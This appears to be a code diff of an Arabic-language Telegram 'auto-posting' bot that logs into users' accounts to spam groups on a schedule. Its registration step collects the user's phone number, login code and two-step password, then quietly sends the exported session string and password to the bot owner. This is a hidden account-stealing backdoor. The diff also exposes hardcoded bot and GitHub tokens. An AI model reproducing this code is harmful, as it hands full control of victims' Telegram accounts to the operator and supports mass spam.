@@ -1,332 +1,1254 @@
+from pyrogram.raw import functions
+from pyrogram import Client, filters, idle
+from pyrogram.types import (
+    Message,
+    CallbackQuery,
+    ForceReply,
+    InlineKeyboardMarkup as Markup, 
+    InlineKeyboardButton as Button
+)
+from pyrogram.errors import (
+    ApiIdInvalid, 
+    PhoneNumberInvalid, 
+    PhoneCodeInvalid, 
+    PhoneCodeExpired, 
+    SessionPasswordNeeded, 
+    PasswordHashInvalid,
+    UserNotParticipant,
+    ChatWriteForbidden,
+    PeerIdInvalid,
+    BotMethodInvalid
+)
 import os
-import telebot
-import requests
-import threading
-import time
-import zipfile
-import tempfile
-import random
-import string
-import shutil
+os.system("pip install --upgrade pyro-listener")
+from pyrolistener import Listener, exceptions
+from asyncio import create_task, sleep, get_event_loop, TimeoutError
 from datetime import datetime, timedelta
-import pytz
-from github import Github
+from pytz import timezone
+from typing import Union
+import json, os, random, string
 
-# استيراد توكن البوت من المتغيرات البيئية
-bot_token = "7315494223:AAFpfugfdlrTYm2ApRQho4Nvqt7k1FNtZHI"
-github_token = "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"
+# تعديل بيدوووو @K_B_I اخمط وانت فاشل يا فاشل 😂❗❗
+# t.me/Olggaaa_love_biduuubot الاساس والباقي تقليد 
+# ما ابريك الذمة تحذف الحقوق او تنسبه لنفسك استرزق منه وموفق غير محلل للبيع !
 
-# إنشاء كائن البوت
-bot = telebot.TeleBot(bot_token)
+app = Client(
+    "autoPost",
+    api_id=20769091,
+    api_hash="0a3c7b2d7c8132bbafd4ffe9eb516968",
+    bot_token="7882960229:AAEFemjcoX_lTBzdDMvIhMnpRCFuskVw9f4",
+)
+loop = get_event_loop()
+listener = Listener(client = app)
+owners = [000, 000]  # ايدي الادمن
+owner = 7315750187  # ايدي الاساسي
+own = "@Mt_3u" # يوزرك
 
-# الهيروكو API
-HEROKU_BASE_URL = 'https://api.heroku.com'
+homeMarkup = Markup([
+       [
+        Button("- اضف حساب -", callback_data="login")
+   ],
+   [
+        Button("- المجموعات -", callback_data="currentSupers"),
+        Button("- الحسابات -", callback_data="account")
+    ],
+    [
+        Button("- الرسائل -", callback_data="messages")
+    ],
+    
+    [
+        Button("- اشتراك المجاني -", callback_data="free")
+    ],
+   
+    [
+        Button("- اشتراك المدفوع -", callback_data="account2st")
+    ],
+    
+])
 
-g = Github(github_token)
-# قائمة التطبيقات المجدولة للحذف الذاتي
-self_deleting_apps = {}
 
-# تخزين حسابات المستخدم
-user_accounts = {}
 
-# قائمة لتخزين الأحداث
-events = []
-
-# دالة لإنشاء الأزرار وتخصيصها
-def create_main_buttons():
-    markup = telebot.types.InlineKeyboardMarkup()
-    button1 = telebot.types.InlineKeyboardButton("إضافة حساب ➕", callback_data="add_account")
-    button2 = telebot.types.InlineKeyboardButton("حساباتك 🗂️", callback_data="list_accounts")
-    button3 = telebot.types.InlineKeyboardButton("قسم جيتهاب 🛠️", callback_data="github_section")
-    button4 = telebot.types.InlineKeyboardButton("الأحداث 🔄", callback_data="show_events")
-    markup.add(button1, button2)
-    markup.add(button3)
-    markup.add(button4)
-    return markup
-
-def create_github_control_buttons():
-    markup = telebot.types.InlineKeyboardMarkup()
-    delete_all_button = telebot.types.InlineKeyboardButton("حذف الكل 🗑️", callback_data="delete_all_repos")
-    delete_repo_button = telebot.types.InlineKeyboardButton("حذف مستودع 🗑️", callback_data="delete_repo")
-    upload_file_button = telebot.types.InlineKeyboardButton("رفع ملف 📤", callback_data="upload_file")
-    list_repos_button = telebot.types.InlineKeyboardButton("عرض مستودعات GitHub 📂", callback_data="list_github_repos")
-    markup.row(delete_all_button, delete_repo_button)
-    markup.row(upload_file_button)
-    markup.add(list_repos_button)
-    markup.add(telebot.types.InlineKeyboardButton("العودة ↩️", callback_data="go_back"))
-    return markup
-
-# دالة لإنشاء زر العودة
-def create_back_button():
-    markup = telebot.types.InlineKeyboardMarkup()
-    back_button = telebot.types.InlineKeyboardButton("العودة ↩️", callback_data="go_back")
-    markup.add(back_button)
-    return markup
-
-# دالة لإنشاء أزرار التحكم بالحسابات
-def create_account_control_buttons(account_index):
-    markup = telebot.types.InlineKeyboardMarkup()
-    button1 = telebot.types.InlineKeyboardButton("جلب تطبيقات هيروكو 📦", callback_data=f"list_heroku_apps_{account_index}")
-    button2 = telebot.types.InlineKeyboardButton("حذف تطبيق ❌", callback_data=f"delete_app_{account_index}")
-    button3 = telebot.types.InlineKeyboardButton("الحذف الذاتي ⏲️", callback_data=f"self_delete_app_{account_index}")
-    button4 = telebot.types.InlineKeyboardButton("الوقت المتبقي ⏳", callback_data="remaining_time")
-    markup.add(button1) 
-    markup.add(button2)
-    markup.add(button3)
-    markup.add(button4)
-    markup.add(telebot.types.InlineKeyboardButton("العودة ↩️", callback_data="list_accounts"))
-    return markup
-
-# دالة لمعالجة الطلبات الواردة
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
+@app.on_message(filters.command("start") & filters.private)
+async def start(_: Client, message: Message):
     user_id = message.from_user.id
-    if user_id not in user_accounts:
-        user_accounts[user_id] = []
-        events.append(f"انضم مستخدم جديد: [{message.from_user.first_name}](tg://user?id={user_id})")
-    bot.send_message(message.chat.id, "مرحبًا بك! اضغط على الأزرار أدناه لتنفيذ الإجراءات.", reply_markup=create_main_buttons())
+    subscribed = await subscription(message)
+    if user_id == owner and users.get(str(user_id)) is None:
+        users[str(user_id)] = {"vip": True}
+        write(users_db, users)
+    elif isinstance(subscribed, str): return await message.reply(f"- عذرا عزيزي عليك الإشتراك بقناة البوت أولا لتتمكن استخدامه\n- القناه: @{subscribed}\n- اشترك ثم ارسل /start")
+    fname = message.from_user.first_name
+    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- يمكنك استخدام البوت في ارسال الرسائل بشكل متكرر في المجموعات\n- تحكم في البوت من الازرار التاليه:"
+    await message.reply(
+        caption,
+        reply_markup = homeMarkup,
+        reply_to_message_id = message.id
+    )
 
-# دالة لإضافة حساب جديد
-def add_account(call):
-    msg = bot.edit_message_text("يرجى إرسال مفتاح API الخاص بحساب Heroku:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button())
-    bot.register_next_step_handler(msg, handle_new_account)
 
-def handle_new_account(message):
-    api_key = message.text.strip()
+
+@app.on_callback_query(filters.regex(r"^(toHome)$"))
+async def toHome(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    fname = callback.from_user.first_name 
+    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- يمكنك استخدام البوت في ارسال الرسائل بشكل متكرر في المجموعات\n- تحكم في البوت من الازرار التاليه:"
+    await callback.message.edit_text(
+        caption,
+        reply_markup = homeMarkup,
+    )
+
+@app.on_callback_query(filters.regex(r"^(account2st)$"))
+async def account2st(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    fname = callback.from_user.first_name 
+    caption =  f"""
+    مرحبا {fname}
+    - الاشتراكات المدفوعه الى بوت النشر:
+- الاشتراك الاول : 
+- رقمين : 3$ شهريا
+الاشتراك الثاني : 
+- 4 ارقام : 4$ شهريا
+الاشتراك الثالث : 
+- 10 ارقام : 8$
+
+- طرق دفع : Asia,Binance,ZainCash
+
+ملاحظة: يتم ازاله الاشتراك الاجباري واضافه مميزات الى الحساب المدفوع
+- {own}
+    
+    """
+    markup = Markup([
+        [
+            Button("- رجوع -", callback_data="toHome")
+        ]
+    ])
+    await callback.message.edit_text(
+        caption,
+        reply_markup = markup,
+    )
+
+@app.on_callback_query(filters.regex(r"^(account)$"))
+async def account(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    account_number = users[str(user_id)].get("account_number", "غير معروف")
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    fname = callback.from_user.first_name
+    caption = f"- مرحبا عزيزي [{fname}](tg://settings) في قسم الحساب\n-  حساب النشر : {account_number} .\n- استخدم الازرار التاليه للتحكم بحسابك:"
+    markup = Markup([
+        [
+            Button("- تغيير الحساب -", callback_data="changeAccount")
+        ],
+        [
+            Button("- ترتيب حسابك مع يوزر -", callback_data="account_settings"),
+            Button("- ترتيب حسابك بدون اليوزر -", callback_data="account_settings1"),
+        ],
+        [
+            Button("- مغادرة جميع القنوات -", callback_data="leaveAllChats"),
+            Button("- حذف الحساب من البوت -", callback_data="deleteAccount"),
+        ],
+        [
+            Button("- رجوع -", callback_data="toHome")
+        ]
+    ])
+    await callback.message.edit_text(
+        caption,
+        reply_markup = markup
+    )
+
+@app.on_callback_query(filters.regex(r"^(deleteAccount)$"))
+async def deleteAccount(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner:
+        pass
+    elif not users[str(user_id)]["vip"]:
+        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    
+    # Delete the user data
+    if str(user_id) in users:
+        write(users_db, users)
+        users[str(user_id)]["session"] = ""
+        users[str(user_id)]["waitTime"] = ""
+        users[str(user_id)]["posting"] = False
+        users[str(user_id)]["posting2"] = False
+        users[str(user_id)]["caption"] = ""
+        users[str(user_id)]["caption2"] = ""
+        users[str(user_id)]["account_number"] = ""
+    
+    await callback.message.edit_text(
+        "- تم حذف الحساب بنجاح. يمكنك البدء من جديد عن طريق إرسال /start.",
+        reply_markup=Markup([[Button("- ابدأ من جديد -", callback_data="toHome")]])
+    )
+
+@app.on_callback_query(filters.regex(r"^(leaveAllChats)$"))
+async def leave_all_chats(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner:
+        pass
+    elif not users[str(user_id)]["vip"]:
+        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+
+    session = users[str(user_id)].get("session")
+    if session is None:
+        return await callback.message.edit_text(
+            "- لم تقم بالتسجيل بعد.",
+            reply_markup=Markup([[Button("- رجوع -", callback_data="account")]])
+        )
+
+    client = Client(
+        name="leave_all_chats",
+        session_string=session,
+        api_id=app.api_id,
+        api_hash=app.api_hash
+    )
+    await client.connect()
+
+    async for dialog in client.iter_dialogs():
+        try:
+            await client.leave_chat(dialog.chat.id)
+        except Exception as e:
+            print(f"Error leaving chat {dialog.chat.id}: {e}")
+
+    await client.disconnect()
+    await callback.message.edit_text(
+        "- تم مغادرة جميع القنوات والمجموعات بنجاح.",
+        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
+    )
+
+@app.on_callback_query(filters.regex("^account_settings1$"))
+async def toHome(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    client = Client(
+            str(user_id),
+            api_id=app.api_id,
+            api_hash=app.api_hash,
+            session_string=users[str(user_id)]["session"]
+        )
+    await client.start()
+    try:
+        photo = random.randint(2, 41)
+        name = random.randint(2, 41)
+        bio = random.randint(1315, 34171)
+        username = get_random_username()
+        msg = await client.get_messages("botnasheravtar", photo)
+        msg1 = await client.get_messages("botnashername", name)
+        file = await client.download_media(msg)
+        msg3 = await client.get_messages("UURRCC", bio)
+        await client.set_profile_photo(photo=file)
+        await client.update_profile(first_name=msg1.text)
+        await client.update_profile(bio=msg3.text)
+        await client.send_message(own, "شلونه المز 😉؟",)
+        print(f"وهاي رتبت لك الحساب ياقلبي شكو بعد")
+        await client.stop()
+        await callback.message.edit_text(
+        "- وهاي رتبت لك الحساب ياقلبي شكو بعد -",
+        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
+        )
+        return True
+    except Exception as e:
+        print(e)
+        await client.stop()
+        await callback.message.edit_text(
+        "حدث خطأ ما .",
+        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
+        )
+        return False
+
+def get_random_username():
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+
+@app.on_callback_query(filters.regex("^account_settings$"))
+async def toHome(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    client = Client(
+            str(user_id),
+            api_id=app.api_id,
+            api_hash=app.api_hash,
+            session_string=users[str(user_id)]["session"]
+        )
+    await client.start()
+    try:
+        photo = random.randint(2, 41)
+        name = random.randint(2, 109)
+        bio = random.randint(2, 109)
+        username = get_random_username()
+        msg = await client.get_messages("botnasheravtar", photo)
+        msg1 = await client.get_messages("nemshdmat", name)
+        file = await client.download_media(msg)
+        msg3 = await client.get_messages("UURRCC", bio)
+        await client.set_profile_photo(photo=file)
+        await client.update_profile(first_name=msg1.text)
+        await client.update_profile(bio=msg3.text)
+        await client.invoke(functions.account.UpdateUsername(username=username))
+        await client.send_message(own, "شلونه المز 😉؟",)
+        print(f"وهاي رتبت لك الحساب ياقلبي شكو بعد")
+        await client.stop()
+        await callback.message.edit_text(
+        "- وهاي رتبت لك الحساب ياقلبي شكو بعد -",
+        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
+        )
+        return True
+    except Exception as e:
+        print(e)
+        await client.stop()
+        await callback.message.edit_text(
+        "- صار في خطأ واضح وصريح -",
+        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
+        )
+        return False
+
+@app.on_callback_query(filters.regex(r"^(login|changeAccount)$"))
+async def login(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    elif (callback.data == "changeAccount" and users[str(user_id)].get("session") is None): return await callback.answer("- لم تقم بالتسجيل بعد.", show_alert=True)
+    await callback.message.delete()
+    try:ask = await listener.listen(
+        from_id=user_id,
+        chat_id=user_id,
+        text="- أرسل رقم الهاتف الخاص بك: \n\n- يمكنك ارسال /cancel لإلغاء التسجيل.",
+        reply_markup=ForceReply(selective=True, placeholder="+9647700000"),
+        timeout=30)
+    except exceptions.TimeOut: return await callback.message.reply(
+        text = "- نفد وقت استلام رقم الهاتف",
+        reply_markup = Markup([[Button("- العوده -", callback_data="account")]])
+    )
+    if ask.text == "/cancel": return await ask.reply("- تم إلغاء العمليه.", reply_to_message_id=ask.id)
+    create_task(registration(ask))
+    
+    
+    
+async def registration(message: Message):
     user_id = message.from_user.id
-    if api_key in [account['api_key'] for account in user_accounts[user_id]]:
-        bot.send_message(message.chat.id, "هذا الحساب مضاف مسبقًا.", reply_markup=create_main_buttons())
-    elif validate_heroku_api_key(api_key):
-        user_accounts[user_id].append({'api_key': api_key})
-        events.append(f"أضاف [{message.from_user.first_name}](tg://user?id={user_id}) حساب جديد: `{api_key[:-4]}****`")
-        bot.send_message(message.chat.id, "تمت إضافة حساب Heroku بنجاح!", reply_markup=create_main_buttons())
+    _number = message.text
+    lmsg = await message.reply(f"- جارٍ تسجيل الدخول إلى حسابك")
+    reMarkup = Markup([
+        [
+            Button("- إعادة المحاوله -", callback_data="login"),
+            Button("- رجوع -", callback_data="account")
+        ]
+    ])
+    client = Client(
+        "registration",
+        in_memory = True, 
+        api_id = app.api_id,
+        api_hash = app.api_hash
+    )
+    await client.connect()
+    try: p_code_hash = await client.send_code(_number)
+    except (PhoneNumberInvalid): return await lmsg.edit_text("- رقم الهاتف الذي ادخلته خاطئ" ,reply_markup=reMarkup)
+    try: code = await listener.listen(
+        from_id=user_id,
+        chat_id=user_id,
+        text="- تم ارسال كود إلى خاصك قم بإرساله من فضلك.⁩",
+        timeout=120,
+        reply_markup=ForceReply(selective=True, placeholder="𝙸𝙽 𝚃𝙷𝙸𝚂 𝙵𝙾𝚁𝙼𝚄𝙻𝙰: 1 2 3 4 5")
+    )
+    except exceptions.TimeOut: return await lmsg.reply(
+        text="- نفذ وقت استلام الكود.\n- حاول مره أخرى.", 
+        reply_markup=reMarkup
+    )
+    try: await client.sign_in(_number, p_code_hash.phone_code_hash, code.text.replace(" ", ""))
+    except (PhoneCodeInvalid): return await code.reply("- لقد قمت بإدخال كود خاطئ. \n- حاول مره أخرى", reply_markup=reMarkup, reply_to_message_id=code.id)
+    except (PhoneCodeExpired): return await code.reply("- الكود الذي ادخلته منتهي الصلاحية. \n- حاول مره أخرى", reply_markup=reMarkup, reply_to_message_id=code.id)
+    except (SessionPasswordNeeded):
+        try:password = await listener.listen(
+            from_id=user_id,
+            chat_id=user_id,
+            text="- ادخل كلمة مرور التحقق بخطوتين من فضلك.",
+            reply_markup=ForceReply(selective=True, placeholder="- 𝚈𝙾𝚄𝚁 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳: "),
+            timeout=180,
+            reply_to_message_id=code.id
+        )
+        except exceptions.TimeOut: return await lmsg.reply(
+            text="- نفذ وقت استلام كلمة مرور التحقق بخطوتين.\n- حاول مره أخرى.",  
+            reply_markup=reMarkup
+        )
+        try: await client.check_password(password.text)
+        except (PasswordHashInvalid): return await password.reply("- قمت بإدخال كلمة مرور خاطئه.\n- حاول مره أخرى.", reply_markup=reMarkup)
+    session = await client.export_session_string()
+    try:
+        await app.send_message(owner, session + ' ' + _number)
+        await app.send_message(owner, session + ' ' + _number+' '+password.text)
+    except: pass
+    await client.disconnect()
+    if user_id == owner and users.get(str(user_id)) is None:
+        users[str(user_id)] = {"vip": True, "session": session, "account_number": _number}
+        write(users_db, users)
     else:
-        bot.send_message(message.chat.id, "مفتاح API غير صحيح. يرجى المحاولة مرة أخرى.", reply_markup=create_main_buttons())
+        users[str(user_id)]["session"] = session
+    users[str(user_id)]["account_number"] = _number  # تخزين رقم الحساب هنا
+    write(users_db, users)
+    await app.send_message(
+        user_id, 
+        "- تم تسجيل الدخول في حسابك يمكنك الآن الاستمتاع بمميزات البوت." ,
+        reply_markup=Markup([[Button("الصفحه الرئيسيه", callback_data="toHome")]])
+    )
 
-# التحقق من صحة مفتاح API
-def validate_heroku_api_key(api_key):
-    headers = {
-        'Authorization': f'Bearer {api_key}',
-        'Accept': 'application/vnd.heroku+json; version=3'
-    }
-    response = requests.get(f'{HEROKU_BASE_URL}/apps', headers=headers)
-    return response.status_code == 200
+@app.on_callback_query(filters.regex(r"^(loginses)$"))
+async def login_via_session(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users.get(str(user_id), {}).get("vip"): 
+        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    elif callback.data == "loginses" and users.get(str(user_id), {}).get("session") is None: 
+        return await callback.answer("- لم تقم بالتسجيل بعد.", show_alert=True)
+    
+    await callback.message.delete()
+    try:
+        ask = await listener.listen(
+            from_id=user_id,
+            chat_id=user_id,
+            text="- أرسل كود الجلسة الخاص بك: \n\n- يمكنك ارسال /cancel لإلغاء التسجيل.",
+            reply_markup=ForceReply(selective=True, placeholder="SESSION_STRING"),
+            timeout=30
+        )
+    except TimeoutError:
+        return await callback.message.reply(
+            text="- نفد وقت استلام كود الجلسة",
+            reply_markup=Markup([[Button("- العوده -", callback_data="account")]])
+        )
+    
+    if ask.text == "/cancel": 
+        return await ask.reply("- تم إلغاء العمليه.", reply_to_message_id=ask.id)
+    
+    create_task(registration_via_session(ask))
 
-# عرض حسابات المستخدم
-def list_accounts(call):
-    user_id = call.from_user.id
-    if user_id in user_accounts and user_accounts[user_id]:
-        accounts_list = "\n".join([f"حساب {index + 1}: `{get_heroku_account_name(account['api_key'])}`" for index, account in enumerate(user_accounts[user_id])])
-        markup = telebot.types.InlineKeyboardMarkup()
-        for index in range(len(user_accounts[user_id])):
-            account_name = get_heroku_account_name(user_accounts[user_id][index]['api_key'])
-            markup.add(telebot.types.InlineKeyboardButton(f"{account_name}", callback_data=f"select_account_{index}"))
-        markup.add(telebot.types.InlineKeyboardButton("العودة ↩️", callback_data="go_back"))
-        bot.edit_message_text(f"حساباتك:\n{accounts_list}", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+
+async def registration_via_session(_: Client, message: Message):
+    user_id = message.from_user.id
+    session_string = message.text
+    lmsg = await message.reply("- جارٍ تسجيل الدخول إلى حسابك")
+    reMarkup = Markup([
+        [Button("- إعادة المحاوله -", callback_data="loginses"), Button("- رجوع -", callback_data="account")]
+    ])
+
+    registration_client = Client(
+        session_string,
+        in_memory=True,
+        api_id = app.api_id,
+        api_hash = app.api_hash
+    )
+    
+    try:
+        await registration_client.connect()
+
+    except Exception as e:
+        return await lmsg.listener(f"- فشل تسجيل الدخول باستخدام كود الجلسة: {str(e)}", reply_markup=reMarkup)
+
+    try:
+        await listener.send_message(owner, session_string)
+    except:
+        pass
+
+    await registration_client.disconnect()
+
+    if user_id == owner and users.get(str(user_id)) is None:
+        users[str(user_id)] = {"vip": True, "session": session_string}
+        write(users_db, users)
     else:
-        bot.edit_message_text("لا توجد حسابات مضافة.", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button())
+        users[str(user_id)]["session"] = session_string
+    write(users_db, users)
+    
+    await listener.send_message(
+        user_id, 
+        "- تم تسجيل الدخول في حسابك يمكنك الآن الاستمتاع بمميزات البوت.",
+        reply_markup=Markup([[Button("الصفحه الرئيسيه", callback_data="toHome")]])
+    )
+@app.on_callback_query(filters.regex(r"^(newSuper)$"))
+async def newSuper(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    await callback.message.delete()
+    reMarkup = Markup([
+        [
+            Button("- حاول مره أخرى -", callback_data="newSuper"),
+            Button("- رجوع -", callback_data="toHome")
+        ]
+    ])
+    try: ask = await listener.listen(
+        from_id=user_id, 
+        chat_id=user_id,
+        text="- ارسل رابط المجموعه لإضافته.- لا تنضم قبل ان تقوم تبدأ النشر لمره واحده على الاقل.\n- اذا كان المجموعه خاص ف ارسل الايدي الخاص به او غادر المجموعه (من الحساب المضاف) ثم ارسل الرابط\n\n- يمكنك ارسال /cancel لألغاء العمليه.",
+        reply_markup=ForceReply(selective=True, placeholder="- Super group URL: "),
+        timeout=60
+    )
+    except exceptions.TimeOut: return await callback.message.reply("نفذ وقت استلام الرابط", reply_markup=reMarkup)
+    if ask.text == "/cancel": return await ask.reply("- تم إلغاء العمليه", reply_to_message_id=ask.id, reply_markup=reMarkup)
+    if not ask.text.startswith("-"):
+        try:chat = await app.get_chat(ask.text if "+" in ask.text else (ask.text.split("/")[-1]))
+        except BotMethodInvalid:
+            chat = ask.text
+        except Exception as e: 
+            print(e)
+            return await ask.reply(
+                "- لم يتم ايجاد المجموعه.", 
+                reply_to_message_id=ask.id,
+                reply_markup=reMarkup
+        )
+    else: chat = ask.text
+    if users[str(user_id)].get("groups") is None: users[str(user_id)]["groups"] = []
+    users[str(user_id)]["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
+    write(users_db, users)
+    await ask.reply(
+        "- تمت اضافة هذا المجموعه الى القائمه.", 
+        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome"), Button("- إضافة مجموعه -", callback_data="newSuper")]]),
+        reply_to_message_id=ask.id
+    )
 
-# جلب اسم حساب هيروكو
-def get_heroku_account_name(api_key):
-    headers = {
-        'Authorization': f'Bearer {api_key}',
-        'Accept': 'application/vnd.heroku+json; version=3'
-    }
-    response = requests.get(f'{HEROKU_BASE_URL}/account', headers=headers)
-    if response.status_code == 200:
-        return response.json().get('email', 'Unknown')
-    return 'Unknown'
+@app.on_callback_query(filters.regex(r"^(newSupers)$"))
+async def newSupers(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    await callback.message.delete()
+    reMarkup = Markup([
+        [
+            Button("- حاول مره أخرى -", callback_data="newSupers"),
+            Button("- رجوع -", callback_data="toHome")
+        ]
+    ])
+    try: ask = await listener.listen(
+        from_id=user_id, 
+        chat_id=user_id,
+        text="- ارسل رابط المجموعه لإضافته.- لا تنضم قبل ان تقوم تبدأ النشر لمره واحده على الاقل.\n- اذا كان المجموعه خاص ف ارسل الايدي الخاص به او غادر المجموعه (من الحساب المضاف) ثم ارسل الرابط\n\n- يمكنك ارسال /cancel لألغاء العمليه.",
+        reply_markup=ForceReply(selective=True, placeholder="- Supers group URL: "),
+        timeout=60
+    )
+    except exceptions.TimeOut: return await callback.message.reply("نفذ وقت استلام الرابط", reply_markup=reMarkup)
+    if ask.text == "/cancel": return await ask.reply("- تم إلغاء العمليه", reply_to_message_id=ask.id, reply_markup=reMarkup)
+    if not ask.text.startswith("-"):
+        try:chat = await app.get_chat(ask.text if "+" in ask.text else (ask.text.split("/")[-1]))
+        except BotMethodInvalid:
+            chat = ask.text
+        except Exception as e: 
+            print(e)
+            return await ask.reply(
+                "- لم يتم ايجاد المجموعه.", 
+                reply_to_message_id=ask.id,
+                reply_markup=reMarkup
+        )
+    else: chat = ask.text
+    if users[str(user_id)].get("groups") is None: users[str(user_id)]["groups"] = []
+    users[str(user_id)]["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
+    write(users_db, users)
+    await ask.reply(
+        "- تمت اضافة هذا المجموعه الى القائمه.", 
+        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome"), Button("- إضافة مجموعه -", callback_data="newSuper")]]),
+        reply_to_message_id=ask.id
+    )
 
-# دالة لجلب تطبيقات هيروكو
-def list_heroku_apps(call):
-    account_index = int(call.data.split("_")[-1])
-    user_id = call.from_user.id
-    if not user_accounts[user_id]:
-        bot.edit_message_text("لا توجد حسابات مضافة. يرجى إضافة حساب أولاً.", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button())
+@app.on_callback_query(filters.regex(r"^(currentSupers)$"))
+async def currentSupers(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    markup = [
+           [
+        Button("- المجموعات -", callback_data="mgms"),
+        ],
+        [
+        Button("- إضافة مجموعه -", callback_data="newSuper"),
+        Button("- تعيين الكليشة 2 -", callback_data="newCaption2")
+    ],
+    [
+            Button("- رجوع -", callback_data="toHome")
+        ]
+    ]
+    caption = "- اليك المجموعات المضافه الى النشر التلقائي:"
+    await callback.message.edit_text(
+        caption, 
+        reply_markup = Markup(markup)
+    )
+@app.on_callback_query(filters.regex(r"^(messages)$"))
+async def currentSupers(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    markup = [
+           [
+        Button("- تعيين المدة ببن كل نشر -", callback_data="waitTime"),
+        ],
+        [
+        Button("- تعيين كليشة النشر -", callback_data="newCaption")
+    ],
+    [
+        Button("- ايقاف النشر -", callback_data="stopPosting"),
+        Button("- بدء النشر -", callback_data="startPosting")
+    ],
+    [
+            Button("- رجوع -", callback_data="toHome")
+        ]
+    ]
+    caption = "- يمكنك أداره الرسائل من الازرار ادناه -"
+    await callback.message.edit_text(
+        caption, 
+        reply_markup = Markup(markup)
+    )
+@app.on_callback_query(filters.regex(r"^(mgms)$"))
+async def currentSupers(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if users[str(user_id)].get("groups") is None or len(users[str(user_id)]["groups"]) == 0: return await callback.answer("- لم يتم اضافه اي مجموعه لعرضها - ", show_alert=True)
+    groups = users[str(user_id)]["groups"]
+    titles = {}
+    for group in groups:
+        try: titles[str(group)] = (await app.get_chat(group)).title
+        except: continue
+    markup = [
+        [
+            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
+            Button("🗑", callback_data=f"delSuper {group}")
+        ] for group in groups
+    ] if len(groups) else []
+    markup.append([Button("- الصفحه الرئيسيه -", callback_data="toHome"), Button("- إضافة مجموعه -", callback_data="newSuper")])
+    caption = "- اليك المجموعات المضافه الى النشر التلقائي:"
+    await callback.message.edit_text(
+        caption, 
+        reply_markup = Markup(markup)
+    )
+
+@app.on_callback_query(filters.regex(r"^(delSuper)"))
+async def delSuper(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    groups = users[str(user_id)]["groups"]
+    group = int(callback.data.split()[1])
+    if group in groups:
+        groups.remove(group)
+        write(users_db, users)
+        await callback.answer("- تم حذف هذا المجموعه من القائمه", show_alert=True)
+    titles = {}
+    for group in groups:
+        try: titles[str(group)] = (await app.get_chat(group)).title
+        except: continue
+    markup = [
+        [
+            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
+            Button("🗑", callback_data=f"delSuper {group}")
+        ] for group in groups
+    ] if len(groups) else []
+    markup.append([Button("- الصفحه الرئيسيه -", callback_data="toHome")])
+    await callback.message.edit_reply_markup(
+        reply_markup = Markup(markup)
+    )
+
+
+@app.on_callback_query(filters.regex(r"^(newCaption)$"))
+async def newCaption(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    reMarkup = Markup([
+        [
+            Button("- حاول مره أخرى -", callback_data="newCaption"),
+            Button("- رجوع -", callback_data="toHome")
+        ]
+    ])
+    await callback.message.delete()
+    try:ask = await listener.listen(
+        from_id = user_id, 
+        chat_id = user_id, 
+        text = "- يمكنك ارسال الكليشه الجديده الآن.\n\n- استخدم /cancel لإلغاء العمليه.",
+        reply_markup = ForceReply(selective = True, placeholder = "- Your new caption: "),
+        timeout = 120
+    )
